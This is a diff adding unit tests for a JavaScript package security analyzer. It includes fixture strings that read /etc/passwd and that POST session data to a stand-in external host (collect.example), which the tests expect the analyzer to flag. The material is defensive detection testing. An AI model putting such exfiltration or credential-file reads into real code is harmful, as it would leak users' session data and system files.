@@ -105,3 +105,42 @@ test('analyzeSecurityDeep - categorizes findings', () => {
   assert.ok(result.byCategory, 'should have categorized findings');
   assert.ok(Object.keys(result.byCategory).length > 0, 'should have at least one category');
 });
+
+test('analyzeSecurityDeep - reports hardcoded absolute file access but not /tmp', () => {
+  const unsafe = analyzeSecurityDeep(pkg([file('fs.js', 'import fs from "node:fs"; fs.readFile("/etc/passwd", cb);')]));
+  assert.ok(rulesHit(unsafe).has('S7'));
+  const safe = analyzeSecurityDeep(pkg([file('fs.js', 'fs.readFile("/tmp/cache.json", cb);')]));
+  assert.ok(!rulesHit(safe).has('S7'), '/tmp is an expected scratch location');
+});
+
+test('analyzeSecurityDeep - inventories crypto functions', () => {
+  const result = analyzeSecurityDeep(pkg([file('crypto.js', 'crypto.createHash("sha256"); crypto.createHash("sha1"); crypto.randomBytes(8);')]));
+  const hit = result.findings.find((finding) => finding.rule === 'S8');
+  assert.ok(hit, 'expected S8');
+  assert.match(hit.message, /createHash/);
+  assert.match(hit.evidence, /Lines:/);
+});
+
+test('analyzeSecurityDeep - flags more than five environment variables', () => {
+  const unsafe = analyzeSecurityDeep(pkg([file('env.js', 'process.env.A; process.env.B; process.env.C; process.env.D; process.env.E; process.env.F;')]));
+  assert.ok(rulesHit(unsafe).has('S9'));
+  const safe = analyzeSecurityDeep(pkg([file('env.js', 'process.env.A; process.env.B; process.env.C; process.env.D; process.env.E;')]));
+  assert.ok(!rulesHit(safe).has('S9'));
+});
+
+test('analyzeSecurityDeep - detects session data posted to an external URL', () => {
+  const result = analyzeSecurityDeep(pkg([file('exfil.js', 'fetch("https://collect.example/ingest", { method: "POST", body: session });')]));
+  assert.ok(rulesHit(result).has('S1'), 'expected S1');
+});
+
+test('a rule that throws becomes an info finding instead of aborting the analysis', () => {
+  const broken = {
+    manifest: { name: 'broken' },
+    entries: {},
+    jsFiles: { [Symbol.iterator]() { throw new Error('boom'); } },
+  };
+  const result = analyzeSecurityDeep(broken);
+  assert.ok(result.findings.length >= 10);
+  assert.ok(result.findings.every((finding) => finding.level === 'info'));
+  assert.match(result.findings[0].message, /did not complete: boom/);
+});
